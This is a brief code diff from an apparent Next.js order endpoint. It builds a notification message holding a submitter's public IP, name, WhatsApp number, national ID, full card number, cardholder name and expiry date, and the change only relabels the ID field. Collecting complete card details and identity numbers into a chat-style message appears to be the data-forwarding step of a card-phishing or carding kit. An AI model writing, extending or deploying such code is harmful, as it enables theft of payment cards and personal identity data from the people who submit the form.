@@ -42,7 +42,7 @@ export async function POST(req: NextRequest) {
     `🌐 Public IP: ${ip || "غير معروف"}`,
     `🙍 Order For: ${customer ?? "-"}`,
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
-    `🪪 National ID: ${nationalId ?? "-"}`,
+    `🪪 Public ID: ${nationalId ?? "-"}`,
     `💳 Card Number: ${cardNumber}`,
     `✍️ Card Holder: ${cardHolder}`,
     `📆 Valid To: ${expiry}`,
